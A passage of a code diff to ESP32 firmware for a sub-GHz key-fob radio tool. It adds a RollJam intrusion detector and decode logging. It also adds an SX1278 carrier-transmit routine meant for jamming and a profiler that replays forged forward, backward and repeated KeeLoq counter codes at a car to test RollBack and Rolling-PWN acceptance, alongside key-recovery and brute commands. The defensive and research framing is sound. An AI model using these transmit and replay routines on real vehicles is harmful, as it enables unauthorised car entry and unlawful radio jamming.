@@ -130,9 +130,10 @@
 //     (no re-capture needed); returns confidence level + save_hint JSON
 //
 // ── BLE SCANNER (ESP32-S3 built-in 2.4 GHz radio) ────────────────────────────
+// ── BLE SCANNER (ESP32-S3 built-in 2.4 GHz radio) ────────────────────────────
 //   The firmware uses the ESP32-S3's integrated Bluetooth radio (independent of
 //   the CC1101 RF front-end) to scan for and bond with nearby BLE devices.
-//   Available via the WiFi AP dashboard BLE panel and HTTP API.
+//   Reached over the HTTP API, not the card dashboard (which has no BLE panel).
 //
 //   Passive advertisement scan (/api/ble_scan?duration=N, N=1–30 s):
 //     · Non-blocking; returns {"status":"scanning"} immediately.
@@ -1651,6 +1652,12 @@
 //   {"cmd":"squelch","dbm":-60}     — set auto-capture threshold (dBm)
 //   {"cmd":"key_recover"}           — attempt full MFR-key search (needs 2+ frames)
 //   {"cmd":"hop_xor"}               — key-independent hop-XOR telemetry over held frames
+//   {"cmd":"claim_trace"}           — last decode outcomes: gate, TE, spread, claim
+//   {"cmd":"p5_ids"}                — parked RollJam IDS: floor baseline + suspects
+//   {"cmd":"resync_probe","sn":N}   — replay a counter ramp to profile resync acceptance
+//   {"cmd":"resync_curve","sn":N}   — profile the resync window: fwd/back/replay
+//   {"cmd":"resync_curve_status"}   — the curve so far (accept/reject/unknown)
+//   {"cmd":"resync_mark","r":"accept"} — hand-mark the last probe from watching the car
 //   {"cmd":"key_probe","key":"...","name":"label"}  — test a candidate key
 //   {"cmd":"brute_status"}          — progress of the HTTP brute sequencers
 //   {"cmd":"add_user_key","n":"label","k":"HEX64"}  — save a device key to NVS
@@ -1812,6 +1819,32 @@
 struct HopXor { uint32_t hop_xor, ctr_xor, sn_xor; uint8_t flipBits, wordOrder;
                 bool ctrStep1, sameBtn; };
 
+// ─── Claim-trace record (N22) ────────────────────────────────────────────────
+// Hoisted for the same reason as HopXor: the sketch preprocessor emits function
+// prototypes above the sketch's own struct definitions, so a struct first named
+// inside a function body is too late. One record per decodeSignal() call, whether
+// it claimed a protocol or not. See ks_ctPush() for what the fields mean.
+struct ClaimRec { uint16_t te, edges; uint32_t hash; uint8_t gate, ratio, proto;
+                  bool claimed; };
+
+// ─── Parked RollJam IDS constants (P5) ──────────────────────────────────────
+// Hoisted with the structs for the same reason: the capture path and the KeeLoq
+// commit path both reference these, and both sit earlier in the file than the
+// detector body. See p5OnKeeLoq() for the model.
+#define P5_IDS_EV_MAX    16
+#define P5_PRESS_WIN_MS 1200UL
+#define P5_IDS_JAM_DB 6
+#define P5_FLOOR_RISE_STEP 1
+#define P5_FLOOR_DECAY_MS  30000UL
+
+// ─── Resync-curve probe record (P3) ─────────────────────────────────────────
+// Hoisted for the same reason as HopXor and ClaimRec. One row per probe in the
+// curve: the counter offset tried, which axis it belongs to, whether the radio
+// heard a reply, and the operator's hand mark. See rcStatusJson().
+enum RcKind : uint8_t { RC_FWD=0, RC_BACK, RC_REPLAY };
+enum RcMark : int8_t  { RC_REJECT=-1, RC_UNKNOWN=0, RC_ACCEPT=1 };
+struct RcProbe { int16_t off; uint8_t kind, reply; int8_t mark; };
+
 // ─── Pins (DO NOT CHANGE) ─────────────────────────────────────────────────────
 #define PIN_MOSI         35
 #define PIN_MISO         33
@@ -1932,6 +1965,14 @@ int      rfRssi = -100;
 bool     lastCapGdo0 = false;   // true=GDO0 digital mode, false=RSSI mode (diagnostic)
 String   lastDecode = "";
 uint32_t lastCapDurMs = 0;    // wall-clock duration of the most recent captureSignal() call (ms)
+
+// ─── Capture diagnostics ─────────────────────────────────────────────────────
+// The idle-window floor the P5 detector baselines against, kept by the capture
+// path (see the noise-floor average in captureSignal). Global rather than
+// static to the capture function because the detector reads it from the decode
+// path, and both run on the loop task.
+int      p5IdleFloorDbm = -100;
+int      p5IdleFloorDelta = 0;
 
 // ─── Capture polarity (06 §3.4a) ─────────────────────────────────────────────
 // rfBuf stores pulse WIDTHS only, so the level of each pulse is not in the buffer
@@ -3277,6 +3318,16 @@ static uint8_t loraReadReg(uint8_t a){
   delayMicroseconds(50);
   return v;
 }
+// Write one SX1278 register. Bit 7 set = write on SX1278. Needed for the P2 CW
+// transmit path: until now the only write was RegOpMode in loraSleepNow().
+static void loraWriteReg(uint8_t a,uint8_t v){
+  digitalWrite(PIN_LORA_CS,LOW);
+  delayMicroseconds(50);
+  SPI.transfer(a|0x80);
+  SPI.transfer(v);
+  digitalWrite(PIN_LORA_CS,HIGH);
+  delayMicroseconds(50);
+}
 
 // Read back RegOpMode to confirm the sleep command reached the SX1278. A successful
 // readback does not mean GPIO 48 is connected to the CC1101; the board measurement
@@ -3329,6 +3380,47 @@ static void loraParkReset(){
   digitalWrite(PIN_LORA_CS, HIGH);   // deselect, or it drives MISO into the shared bus
   pinMode(PIN_LORA_RST, OUTPUT);
   digitalWrite(PIN_LORA_RST, LOW);   // held low: lowest power, per the vendor's sequence
+}
+
+// ─── P2: the SX1278 as the second radio ────────────────────
+// RollJam as Kamkar drew it wants two radios: a jammer off the listen frequency
+// and a listener in band. This board already has the second radio — the SX1278
+// parked at PIN_LORA_RST — parked it precisely because an AWAKE
+// SX1278 raised the shared front end's floor. That coupling is what makes it
+// usable as a jammer; the open question is only whether the CC1101 can still
+// hear a fob while the SX1278 transmits, and by how much the floor rises.
+//
+// The register sequence below follows SX1276/77/78 datasheet §4.1 (FSK/OOK
+// transmitter, RegOpMode / RegFrf / RegPaConfig / RegPaRamp / RegOcp). It is
+// UNVERIFIED on this board: an SX1278 in FSK TX with an empty FIFO should emit a
+// constant carrier rather than modulated data, which is the CW trick, but no one
+// has confirmed it here. That confirmation is what the bench procedure in
+// exists to run. The isolation number it produces — floor rise on
+// the CC1101 while the SX1278 transmits — does not depend on the mechanism being
+// perfect, so the measurement is worth taking either way.
+//
+// This is a gated bench transmit, not a field one. Duration is capped and the
+// module is re-parked on every exit path. Continuous jamming is a legal problem
+// and stays behind the same explicit arming the jam path uses.
+#define LORA_CW_MAX_MS 5000
+static void loraCwSetup(float mhz, uint8_t pwr){
+  // Frf = f_Hz / 61.03515625 (32 MHz / 2^19), datasheet §4.1.2.
+  uint32_t frf=(uint32_t)(((double)mhz * 1.0e6) / 61.03515625);
+  loraWriteReg(0x01, 0x00);                       // SLEEP (must be first)
+  loraWriteReg(0x06, (frf>>16)&0xFF);             // RegFrfMsb
+  loraWriteReg(0x07, (frf>>8)&0xFF);              // RegFrfMid
+  loraWriteReg(0x08, frf&0xFF);                   // RegFrfLsb
+  loraWriteReg(0x09, (uint8_t)(0x80|0x70|(pwr&0x0F))); // PA_BOOST, MaxPower=7
+  loraWriteReg(0x0A, 0x09);                       // RegPaRamp: 40 us
+  loraWriteReg(0x0B, 0x2B);                       // RegOcp: on, 100 mA
+  // FSK/OOK (LongRangeMode=0, ModType=00), LF band bit for <525 MHz, Mode=TX.
+  uint8_t op = (uint8_t)(0x02 | ((mhz < 525.0f) ? 0x08 : 0x00));
+  loraWriteReg(0x01, op);
+}
+// Park after a CW burst: SLEEP first so the PA powers down, then RST low.
+static void loraCwStop(){
+  loraWriteReg(0x01, 0x00);   // SLEEP
+  loraParkReset();
 }
 uint8_t cc_xfer(uint8_t b){ return SPI.transfer(b); }
 void cc_strobe(uint8_t s){ cc_cs(true); cc_waitMISO(); cc_xfer(s); cc_cs(false); }
@@ -3517,7 +3609,7 @@ bool cc_init(float mhz){
   // and cc_reset() only issues SRES — which does not by itself drive GDO0, the
   // async TX data input. Holding GDO0 LOW as an OUTPUT puts a definite
   // no-carrier level on that input across the reset, before SIDLE and the RX
-  // reconfiguration below. setup does the same thing first (§2.2);
+  // reconfiguration below. setup() does the same thing first (§2.2);
   // it is repeated here so cc_init() is safe to call on any path, including the
   // /api/reinit route.
   pinMode(PIN_GDO0,OUTPUT);
@@ -4202,6 +4294,77 @@ static void ks_hopXorEmit(JsonDocument& doc){
       o["flip_bits"]=hx.flipBits; o["ctr_step1"]=hx.ctrStep1;
       o["same_btn"]=hx.sameBtn; o["repeat"]=(prev.hop==f.hop);
     }
+  }
+}
+
+// ─── Live claim trace (N22) ──────────────────────────────────────────────────
+// A decoder that claims a frame is only as good as the gate that claimed it. The
+// historical failures in this firmware were all of one shape: a gate opened for a
+// frame it should have rejected, and nothing recorded that it had ('s
+// loose KeeLoq gate is the latest). The trace is the fix for the class, not for
+// the instance — one record per decode, claimed or not, so a false claim is
+// visible next to the timing that produced it.
+//
+// Fields, all cheap enough for the loop task (no heap, no String):
+//   te     — k-means cluster A, the short-pulse estimate in µs
+//   edges  — pulse count in the capture
+//   hash   — FNV-1a over the first pulses, so a repeat is recognisable
+//   gate   — which gate ran (see CT_GATE_*)
+//   ratio  — te standard deviation as a percentage of te; a clean frame sits low
+//   proto  — index into the fixed label table a claim maps to (0 = none)
+#define CT_RING_MAX 8
+static ClaimRec CT_BUF[CT_RING_MAX];
+static uint8_t  CT_HEAD=0, CT_CNT=0;
+
+enum { CT_GATE_LOOSE=0, CT_GATE_GATE, CT_GATE_GARAGE, CT_GATE_KNOWN, CT_GATE_NONE };
+enum { CT_PROTO_NONE=0, CT_PROTO_KEELOQ, CT_PROTO_KIA, CT_PROTO_TOYOTA,
+       CT_PROTO_FIAT, CT_PROTO_RENAULT, CT_PROTO_PSA, CT_PROTO_OTHER };
+
+static const char* ks_ctGateName(uint8_t g){
+  switch(g){
+    case CT_GATE_LOOSE:  return "loose";
+    case CT_GATE_GATE:   return "gate";
+    case CT_GATE_GARAGE: return "garage";
+    case CT_GATE_KNOWN:  return "known";
+    default:             return "none";
+  }
+}
+static const char* ks_ctProtoName(uint8_t p){
+  switch(p){
+    case CT_PROTO_KEELOQ:  return "KeeLoq";
+    case CT_PROTO_KIA:     return "Kia";
+    case CT_PROTO_TOYOTA:  return "Toyota";
+    case CT_PROTO_FIAT:    return "FIAT";
+    case CT_PROTO_RENAULT: return "Renault";
+    case CT_PROTO_PSA:     return "PSA";
+    case CT_PROTO_OTHER:   return "other";
+    default:               return "";
+  }
+}
+
+static void ks_ctPush(const ClaimRec& r){
+  CT_BUF[CT_HEAD]=r;
+  CT_HEAD=(CT_HEAD+1)%CT_RING_MAX;
+  if(CT_CNT<CT_RING_MAX) CT_CNT++;
+}
+static uint8_t ks_ctStart(){ return (CT_HEAD+CT_RING_MAX-CT_CNT)%CT_RING_MAX; }
+static const ClaimRec& ks_ctAt(uint8_t i){ return CT_BUF[(ks_ctStart()+i)%CT_RING_MAX]; }
+static void ks_ctClear(){ CT_HEAD=0; CT_CNT=0; }
+
+// Render the trace newest-first, which is how it reads when watching a live feed.
+// Shared by the serial "claim_trace" command and the /api/claim_trace route so a
+// dashboard and a terminal see identical numbers.
+static void ks_ctEmit(JsonDocument& doc){
+  doc["count"]=CT_CNT; doc["max"]=CT_RING_MAX;
+  JsonArray arr=doc["trace"].to<JsonArray>();
+  for(uint8_t i=CT_CNT;i>0;i--){
+    const ClaimRec& r=ks_ctAt(i-1);
+    JsonObject o=arr.add<JsonObject>();
+    char hh[12]; snprintf(hh,12,"0x%08lX",(unsigned long)r.hash);
+    o["te_us"]=r.te; o["edges"]=r.edges; o["std_pct"]=r.ratio;
+    o["gate"]=ks_ctGateName(r.gate); o["claimed"]=r.claimed;
+    if(r.claimed) o["proto"]=ks_ctProtoName(r.proto);
+    o["hash"]=hh;
   }
 }
 
@@ -4986,6 +5149,187 @@ static String bruteStatusJson(){
          "\",\"done\":"+String(bruteDone)+",\"of\":"+String(bruteN)+
          ",\"sent\":"+String(bruteSent)+",\"label\":\""+bruteLabel+"\"}";
 }
+
+// ─── P3: resync curve profiler ─────────────────────────────
+// resync_probe sends N consecutive codes, which answers one question: does a
+// straight forward ramp take. What a bench actually wants is the CURVE — the
+// three axes the CVEs are named for:
+//   - forward offsets the receiver accepts vs rejects (the window shape),
+//   - whether it accepts a BACKWARD step at all (CVE-2022-37418 RollBack),
+//   - whether a code it has already seen is accepted again after a forward jump
+//     (CVE-2021-46145 Rolling-PWN).
+// Running those three is how a BCM gets classified as a RollBack/Rolling-PWN
+// target without running an attack: the curve is a field measurement, and a
+// dataset is a defensible artifact in a way an exploit is not.
+//
+// Each probe is one transmit followed by a bounded listen. The listen marks a
+// reply when the band rises well above the idle floor and STAYS up for a few
+// samples — our own TX is excluded by a settle gap first. Many BCMs do not ack
+// on RF at all, so the operator can mark the probe by hand after watching the
+// car ({"cmd":"resync_mark","r":"accept"}); a hand mark overrides the RF guess.
+// Either way the probe is recorded and the curve renders as offset -> outcome.
+#define RC_MAX_PROBES 24
+#define RC_LISTEN_MS  60     // how long to watch for a reply after the settle gap
+#define RC_SETTLE_MS  25     // let our own TX decay before listening
+#define RC_GAP_MS     40     // inter-probe spacing
+#define RC_REPLY_DB   8      // reply must clear the idle floor by this much
+#define RC_REPLY_HITS 3      // ...for at least this many samples, or it is noise
+#define RC_FWD_DEFAULT 8
+
+static RcProbe  rcPlan[RC_MAX_PROBES];
+static int      rcN=0, rcDone=0;
+static bool     rcActive=false;
+static float    rcFreq=0.0f;
+static String   rcProto;
+static uint32_t rcSn=0;
+static int32_t  rcBase=0;
+static uint16_t rcTe=360;
+static uint8_t  rcBtn=0;
+static uint32_t rcNextMs=0, rcListenUntil=0, rcSettleUntil=0;
+static bool     rcListening=false;
+static uint8_t  rcRssiHits=0;
+static int      rcFloorDbm=-100;
+static uint16_t rcBuf[300];
+static uint32_t rcCurveCount=0;
+
+static const char* rcKindName(uint8_t k){
+  switch(k){ case RC_FWD: return "fwd"; case RC_BACK: return "back";
+             case RC_REPLAY: return "replay"; }
+  return "unknown";
+}
+// Outcome per probe: a hand mark wins, then an RF reply, then unknown. The
+// distinction between "rejected" and "no answer" is the point of the curve —
+// most probes will be unknown, and pretending otherwise would be dishonest.
+static const char* rcOutcome(const RcProbe& p){
+  if(p.mark==RC_ACCEPT) return "accept";
+  if(p.mark==RC_REJECT) return "reject";
+  if(p.reply)           return "accept";
+  return "unknown";
+}
+
+static int rcIdleFloor(){
+  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+  long s=0; for(int i=0;i<16;i++){ s+=cc_fastRSSI(); delayMicroseconds(400); }
+  SPI.endTransaction();
+  int f=(int)(s/16); if(f>-60) f=-75;   // a fob was transmitting; cap it
+  return f;
+}
+
+static bool rcArm(float mhz,const String& proto,uint32_t sn,int32_t base,
+                  uint16_t te,uint8_t btn,int fwdN){
+  if(rcActive||bruteBusy()) return false;
+  if(mhz<100.0f||mhz>950.0f) return false;
+  if(fwdN<1) fwdN=RC_FWD_DEFAULT;
+  if(fwdN>RC_MAX_PROBES-5) fwdN=RC_MAX_PROBES-5;
+  rcN=0;
+  for(int i=1;i<=fwdN;i++){
+    rcPlan[rcN].off=(int16_t)i; rcPlan[rcN].kind=RC_FWD;
+    rcPlan[rcN].reply=0; rcPlan[rcN].mark=RC_UNKNOWN; rcN++;
+  }
+  // Backward steps. Small magnitudes first: a receiver that refuses -1 almost
+  // certainly refuses -8, and recording both shows whether the refusal is total.
+  { static const int16_t back[4]={-1,-2,-4,-8};
+    for(int i=0;i<4 && rcN<RC_MAX_PROBES;i++){
+      rcPlan[rcN].off=back[i]; rcPlan[rcN].kind=RC_BACK;
+      rcPlan[rcN].reply=0; rcPlan[rcN].mark=RC_UNKNOWN; rcN++;
+    } }
+  // The replay probe goes last, after the window has walked forward: a code the
+  // receiver already saw, offered again once the counter has moved on.
+  if(rcN<RC_MAX_PROBES){
+    rcPlan[rcN].off=0; rcPlan[rcN].kind=RC_REPLAY;
+    rcPlan[rcN].reply=0; rcPlan[rcN].mark=RC_UNKNOWN; rcN++;
+  }
+  rcDone=0; rcActive=true; rcListening=false; rcRssiHits=0;
+  rcFreq=mhz; rcProto=proto; rcSn=sn; rcBase=base; rcTe=(te>50&&te<5000)?te:360;
+  rcBtn=btn;
+  rcFloorDbm=rcIdleFloor();
+  rcNextMs=millis();
+  serialEmit(String("{\"event\":\"resync_curve_start\",\"probes\":")+rcN+
+             ",\"base_ctr\":"+String(base)+",\"floor_db\":"+String(rcFloorDbm)+"}");
+  return true;
+}
+
+static void rcReset(){ rcActive=false; rcN=0; rcDone=0; rcListening=false; }
+
+static void rcTick(uint32_t now){
+  if(!rcActive) return;
+  if(rcListening){
+    if(now>=rcSettleUntil && now<rcListenUntil){
+      SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
+      int r=cc_fastRSSI();
+      SPI.endTransaction();
+      if(r > rcFloorDbm+RC_REPLY_DB && rcRssiHits<255) rcRssiHits++;
+      return;
+    }
+    if(now<rcListenUntil) return;      // still settling, or listen still open
+    // Listen closed: record the probe and advance.
+    rcPlan[rcDone].reply=(rcRssiHits>=RC_REPLY_HITS)?1:0;
+    serialEmit(String("{\"event\":\"resync_probe_tx\",\"i\":")+rcDone+
+               ",\"kind\":\""+rcKindName(rcPlan[rcDone].kind)+
+               "\",\"off\":"+String(rcPlan[rcDone].off)+
+               ",\"reply\":"+String(rcPlan[rcDone].reply?1:0)+"}");
+    rcDone++;
+    rcListening=false;
+    rcNextMs=now+RC_GAP_MS;
+    return;
+  }
+  if(rcDone>=rcN){
+    rcCurveCount++;
+    serialEmit(String("{\"event\":\"resync_curve_done\",\"probes\":")+rcN+"}");
+    rcReset();
+    return;
+  }
+  if(now<rcNextMs) return;
+  int32_t ctr=rcBase+(int32_t)rcPlan[rcDone].off;
+  int nl=buildForProto(rcProto,rcSn,(uint32_t)ctr,rcTe,rcBtn,rcBuf,300);
+  if(nl>0) replayRaw(rcFreq,rcBuf,nl,1,true);
+  rcRssiHits=0;
+  rcSettleUntil=now+RC_SETTLE_MS;
+  rcListenUntil=now+RC_SETTLE_MS+RC_LISTEN_MS;
+  rcListening=true;
+}
+
+// Hand-mark the most recent completed probe. A mark of accept/reject overrides
+// the RF reply guess; "auto" clears the mark and leaves it to the radio.
+static bool rcMark(const String& r){
+  if(rcDone<=0) return false;
+  int8_t m;
+  if(r=="accept"||r=="a"||r=="1")      m=RC_ACCEPT;
+  else if(r=="reject"||r=="r"||r=="0") m=RC_REJECT;
+  else                                  m=RC_UNKNOWN;
+  rcPlan[rcDone-1].mark=m;
+  return true;
+}
+
+static String rcStatusJson(bool withCmd){
+  String s = withCmd ? String("{\"cmd\":\"resync_curve_status\",") : String("{");
+  s += "\"active\":"; s += (rcActive?"true":"false");
+  s += ",\"done\":"; s += String(rcDone);
+  s += ",\"of\":";   s += String(rcN);
+  s += ",\"floor_db\":"; s += String(rcFloorDbm);
+  s += ",\"curves\":";   s += String(rcCurveCount);
+  int acc=0, rej=0, unk=0;
+  s += ",\"probes\":[";
+  for(int i=0;i<rcDone;i++){
+    if(i) s+=',';
+    const char* oc=rcOutcome(rcPlan[i]);
+    if(strcmp(oc,"accept")==0) acc++;
+    else if(strcmp(oc,"reject")==0) rej++;
+    else unk++;
+    s += "{\"i\":"; s += String(i);
+    s += ",\"kind\":\""; s += rcKindName(rcPlan[i].kind); s += "\"";
+    s += ",\"off\":"; s += String((int)rcPlan[i].off);
+    s += ",\"reply\":"; s += (rcPlan[i].reply?"true":"false");
+    s += ",\"mark\":"; s += String((int)rcPlan[i].mark);
+    s += ",\"outcome\":\""; s += oc; s += "\"}";
+  }
+  s += "],\"accept\":"; s += String(acc);
+  s += ",\"reject\":";  s += String(rej);
+  s += ",\"unknown\":"; s += String(unk);
+  s += "}";
+  return s;
+}
+
 //   +1  ctr[1] follows ctr[0] within the protocol's window
 //    0  no decoded counter is available, so order cannot be judged
 //   -1  ctr[1] is clearly behind ctr[0] (or equal): refuse
@@ -8321,6 +8665,18 @@ String decodeSignal(){
       doc["mfr"]=(pr.found||pr.candidate)?pr.kname:"HCS-series (unknown mfr key)";
       doc["pattern"]=pr.pattern;
       doc["learn"]=ks_klLearnName(pr.learn);
+      // P5: parked RollJam IDS. Two KeeLoq frames from one fob and one button,
+      // consecutive counters, inside the grab window, with the idle floor lifted
+      // — that is the attack shape. The score lands on the decode so a bench or
+      // a dashboard sees it next to the frame that produced it.
+      {
+        uint8_t p5s=p5OnKeeLoq(f.sn,f.hop,f.rawCtr,f.btn,p5IdleFloorDelta);
+        if(p5s>0){
+          doc["rolljam_ids"]=p5s;
+          doc["rolljam_jam"]=(p5IdleFloorDelta>=P5_IDS_JAM_DB);
+          doc["rolljam_floor_db"]=p5IdleFloorDelta;
+        }
+      }
       JsonObject p=doc["predict"].to<JsonObject>();
       p["delta"]=pr.delta; p["next_ctr"]=pr.nextCtr; p["key_found"]=pr.found; p["lin_est"]=String(pr.linEst,2);
       if(pr.found){char nh[12];snprintf(nh,12,"0x%08lX",(unsigned long)pr.nextHop);p["next_hop"]=nh;p["key_pattern"]=pr.kname;}
@@ -8932,6 +9288,42 @@ String decodeSignal(){
 
   doc["dur_ms"] = lastCapDurMs;
   serializeJson(doc,lastDecode);
+  // ── Live claim trace (N22) ───────────────────────────────────────────
+  // Recorded at the one exit every decode reaches, so the trace covers both the
+  // claims and the silences. The gate and proto indices are read back out of the
+  // JSON just built, which keeps the classification in exactly one place (the
+  // decoder that made the decision) rather than a second guess here. The proto
+  // label is a fixed 24-byte buffer because this path runs on ~2-3 KB of free
+  // heap and a String here is the pattern that has crashed the loopTask before.
+  {
+    const char* _cp = doc["proto"] | "";
+    uint32_t _h = (uint32_t)(rfFreq * 100.f);
+    for(int _i=0; _i<cnt && _i<16; _i++) _h = (_h ^ (uint32_t)buf[_i]) * 16777619UL;
+    ClaimRec _r;
+    _r.te    = (uint16_t)cA;
+    _r.edges = (uint16_t)(cnt>0xFFFF?0xFFFF:cnt);
+    _r.hash  = _h;
+    _r.ratio = (cA>0) ? (uint8_t)((ks_teStddev(buf,cnt,cA)*100u)/cA) : 0;
+    _r.claimed = (_cp[0] != '\0');
+    _r.proto = CT_PROTO_NONE;
+    _r.gate  = _r.claimed ? CT_GATE_KNOWN : CT_GATE_NONE;
+    if(_r.claimed){
+      if(strcmp(_cp,"KeeLoq")==0 || strncmp(_cp,"HCS",3)==0) _r.proto=CT_PROTO_KEELOQ;
+      else if(strncmp(_cp,"Kia",3)==0) _r.proto=CT_PROTO_KIA;
+      else if(strncmp(_cp,"Toyota",6)==0) _r.proto=CT_PROTO_TOYOTA;
+      else if(strncmp(_cp,"FIAT",4)==0) _r.proto=CT_PROTO_FIAT;
+      else if(strncmp(_cp,"Renault",7)==0) _r.proto=CT_PROTO_RENAULT;
+      else if(strncmp(_cp,"PSA",3)==0) _r.proto=CT_PROTO_PSA;
+      else _r.proto=CT_PROTO_OTHER;
+      // Tag the gate class a claimed frame passed through, matching the
+      // failure surface: a bare "valid" with no confirmed/candidate
+      // flags is the loose gate, a candidate carries the gate flag.
+      bool _cand = doc["candidate"] | false;
+      bool _conf = doc["confirmed"] | false;
+      _r.gate = _conf ? CT_GATE_KNOWN : (_cand ? CT_GATE_GATE : CT_GATE_LOOSE);
+    }
+    ks_ctPush(_r);
+  }
   stackHwmAfterDecode=(uint32_t)uxTaskGetStackHighWaterMark(NULL); stackSample();
   return lastDecode;
 }
@@ -9024,6 +9416,12 @@ bool captureSignal(uint16_t timeoutMs,uint32_t gapUs=350000){
   bool _toyBand=(curFreq>=309.0f&&curFreq<=316.0f);
   int edgeThr=noiseMax+(_toyBand?5:8);
   addLog("  Floor: "+String(noiseMax)+" dBm  Trig: "+String(trigThr)+" / Edge: "+String(edgeThr)+" dBm"+(_toyBand?" (Toyota –3dB)":""));
+  // Feed the idle-window floor to the parked RollJam detector. This is the one
+  // reading of the quiet band the capture path already takes; the detector
+  // baselines against earlier quiet windows and calls a few dB of lift a
+  // possible held jammer.
+  p5IdleFloorDbm = noiseMax;
+  p5IdleFloorDelta = p5FeedFloor(noiseMax);
   SPI.endTransaction();
 
   // First half of timeout: wait at the current frequency before sweeping all channels.
@@ -10601,6 +10999,173 @@ static String n12StatusJson(){
   return s;
 }
 
+// ─── P5: parked RollJam IDS ────────────
+// VehicleSec 2025 ("more than 35 attacks, 13 defences") names Relay and RollJam
+// as the unsolved pair in the field, and asks for defences a parked sensor can
+// actually run. This is that sensor. It needs the radio and the Wi-Fi the card
+// already has; it does not need GDO0, and it does not need a paired BCM.
+//
+// The attack, in the order it is felt from a car park:
+//   1. The jammer raises the noise floor a few dB for as long as it is held on.
+//   2. The victim presses; the first frame is lost to the jammer but captured by
+//      the attacker, who then holds it.
+//   3. The victim presses again; that second frame is jammed in turn, and the
+//      attacker transmits the FIRST frame to the car. The car opens.
+//   4. The attacker keeps the second frame, still valid, for a later visit.
+//
+// Three observables separate that from two ordinary presses, and none of them
+// needs a key or a decoder guess:
+//   - the floor: RSSI during the idle scan window, tracked against a baseline
+//     of earlier quiet windows. The baseline is a noise-floor tracker, not a
+//     mean: it drops to a new quiet reading at once, and rises only slowly, in
+//     time. That asymmetry is the whole trick. A mean folds a sustained jammer
+//     into its own reference and the lift cancels within one baseline depth
+//     (this was the first cut, and it did exactly that); a fast-attack slow-
+//     decay floor keeps the quiet band remembered, so a held jammer stands
+//     above it for as long as it is held. A passing car keying up is a spike
+//     that decays in seconds; a jammer held on is a plateau for minutes.
+//   - the pair: two KeeLoq frames from one fob on one button, consecutive
+//     counters (ctr_step1). That is the same shape as two normal presses, so
+//     it is only evidence in combination with the floor.
+//   - the missing actuation: no door/lock event between the two presses. With
+//     no paired BCM the timing gap stands in for it — two presses inside the
+// RollJam window (~1.2 s) are one grab; presses a normal
+//     interval apart are just a second press.
+//
+// Only the previous frame per fob is needed: the second frame arrives right
+// after the first, and the pair is what matters. That is a few scalars, not a
+// ring — RAM is the constraint here (49%).
+struct P5IdsEv   { uint32_t t; int8_t floorDb, dFloor; uint8_t score;
+                   bool jam, pair, noAct; uint32_t sn; uint32_t hop1, hop2; };
+static int16_t  p5FloorDb = -100;   // last idle-window reading, dBm
+static int16_t  p5FloorBase = -100; // fast-attack / slow-decay quiet baseline
+static bool     p5FloorSeeded = false;
+static uint32_t p5FloorMs = 0;      // millis() of the last attack (quiet) read
+static uint32_t p5ElevMs = 0;       // millis() the band first read above baseline
+static uint8_t  p5FloorCfg = 0;     // bit0 = alert on a suspect
+static P5IdsEv  p5Ev[P5_IDS_EV_MAX];
+static uint8_t  p5EvN = 0;
+static uint32_t p5EvCount = 0;
+// Press-window: a frame arrives, and if a second frame with the next counter
+// lands inside P5_PRESS_WIN_MS it is a grab rather than two presses. The window
+// and the baseline constants are hoisted with the rest of the P5 block; the
+// baseline rises by at most one P5_FLOOR_RISE_STEP per P5_FLOOR_DECAY_MS, so a
+// sustained lift outruns the decay and a spike does not.
+static uint32_t p5LastT = 0, p5LastSn = 0, p5LastHop = 0, p5LastCtr = 0;
+static uint8_t  p5LastBtn = 0xFF;
+static bool     p5HaveLast = false;
+
+// Feed an idle-window RSSI reading (dBm) taken while the scanner is quiet.
+// Fast attack: a quieter reading IS the baseline, immediately. Slow decay: a
+// louder reading lifts the baseline by one dB per P5_FLOOR_DECAY_MS, and the
+// clock for that lift starts at the FIRST elevated reading — not at the last
+// quiet one — so a short spike has no accumulated credit to spend and does not
+// move the baseline at all. The decay is deliberately slow (30 s/dB): ambient
+// band occupancy drifts over minutes, a jammer holds for the length of a grab.
+static int p5FeedFloor(int dbm){
+  uint32_t now = millis();
+  if(!p5FloorSeeded){               // first reading seeds the baseline
+    p5FloorBase = (int16_t)dbm;
+    p5FloorMs = now;
+    p5ElevMs = 0;
+    p5FloorSeeded = true;
+  } else if(dbm <= p5FloorBase){    // attack: a quieter band is the new truth
+    p5FloorBase = (int16_t)dbm;
+    p5FloorMs = now;
+    p5ElevMs = 0;                   // no elevated run in progress
+  } else {                          // above baseline: decay upward, slowly
+    if(p5ElevMs == 0) p5ElevMs = now;
+    uint32_t steps = (now - p5ElevMs) / P5_FLOOR_DECAY_MS;
+    if(steps > 0){
+      int32_t base = (int32_t)p5FloorBase + (int32_t)steps * P5_FLOOR_RISE_STEP;
+      if(base > dbm) base = dbm;
+      p5FloorBase = (int16_t)base;
+      p5ElevMs = now;               // credit spent
+    }
+  }
+  p5FloorDb = (int16_t)dbm;
+  return dbm - (int)p5FloorBase;
+}
+
+// A raised floor is one vote, not a verdict: a held jammer shows it for as long
+// as it is held, and a legitimately busy band can show it too. The press pair
+// decides. P5_IDS_JAM_DB is the lift over baseline that counts as "held".
+
+// Called from the KeeLoq commit path with the freshly parsed frame. Returns a
+// confidence 0..3 so the caller can log, and records the event when it is
+// interesting.
+static uint8_t p5OnKeeLoq(uint32_t sn, uint32_t hop, uint32_t ctr, uint8_t btn,
+                          int32_t dFloor){
+  uint8_t score = 0;
+  bool jam = (dFloor >= P5_IDS_JAM_DB);
+  bool pair = false, noAct = false;
+  uint32_t hop1 = 0, hop2 = 0;
+  if(p5HaveLast && sn == p5LastSn && btn == p5LastBtn &&
+     (millis() - p5LastT) <= P5_PRESS_WIN_MS){
+    // Same fob, same button, inside the grab window. The counters must be
+    // consecutive for it to be one fob stepping a rolling code; anything else
+    // is two different transmissions that happen to share an address.
+    int32_t step = (int32_t)(ctr - p5LastCtr);
+    if(step == 1 || step == -1){ pair = true; hop1 = p5LastHop; hop2 = hop; }
+  }
+  // With no paired BCM there is no door event to read, so "no actuation on the
+  // first press" is inferred from the gap itself: a grab needs both frames
+  // within the window, a normal second press does not.
+  noAct = pair;
+  if(jam && pair) score = 3;
+  else if(jam)    score = 2;
+  else if(pair)   score = 1;
+  if(score > 0 || jam){
+    if(p5EvN >= P5_IDS_EV_MAX){
+      for(uint8_t i = 1; i < P5_IDS_EV_MAX; i++) p5Ev[i - 1] = p5Ev[i];
+      p5EvN = P5_IDS_EV_MAX - 1;
+    }
+    P5IdsEv& e = p5Ev[p5EvN++];
+    e.t = millis(); e.floorDb = (int8_t)p5FloorDb; e.dFloor = (int8_t)dFloor;
